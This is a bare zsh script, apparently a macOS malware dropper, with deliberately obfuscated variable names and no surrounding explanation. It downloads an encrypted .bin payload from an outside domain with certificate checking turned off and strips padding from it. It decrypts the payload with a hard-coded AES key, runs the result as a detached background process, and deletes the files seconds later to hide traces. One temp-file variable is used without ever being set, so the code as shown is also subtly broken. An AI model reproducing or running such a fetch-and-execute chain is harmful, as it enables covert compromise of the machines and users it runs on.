#!/bin/zsh
e4kyh=$(mktemp /tmp/dfbmcm.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m2ddbf00d0ed53512.bin" -o "$e4kyhz" || exit 1
s2n9gy=$(stat -f %z "$e4kyhz"); gyddkzt=$(( s2n9gy - 1368 - 841 ))
tail -c +$(( 1368 + 1 )) "$e4kyhz" | head -c $gyddkzt | openssl enc -d -aes-256-cbc -k 49e66559a61654bb71669329 -out "$e4kyh" 2>/dev/null
[ -s "$e4kyh" ] && chmod 700 "$e4kyh" && ( "$e4kyh" & ) && disown
( sleep 3; rm -f "$e4kyh" "$e4kyhz" ) &>/dev/null &
